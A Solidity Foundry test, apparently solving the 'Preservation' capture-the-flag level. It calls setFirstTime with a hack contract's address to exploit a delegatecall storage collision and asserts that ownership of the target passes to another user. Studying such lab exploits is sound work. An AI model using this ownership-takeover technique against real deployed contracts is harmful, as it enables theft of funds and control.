// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/Preservation.sol";
import "../src/PreservationHack.sol";

contract PreservationTest is Test {
    LibraryContract public src1;
    LibraryContract public src2;
    Preservation public target;
    PreservationHack public hack;
    address public user = vm.addr(1);

    function setUp() public {
        src1 = new LibraryContract();
        src2 = new LibraryContract();
        target = new Preservation(address(src1), address(2));
        hack = new PreservationHack();
    }

    function testHack() public {
        assertEq(target.owner(), address(this));

        target.setFirstTime(uint256(uint160(address(hack))));

        vm.prank(user);
        target.setFirstTime(uint256(uint160(address(hack))));

        assertEq(target.owner(), user);
    }
}
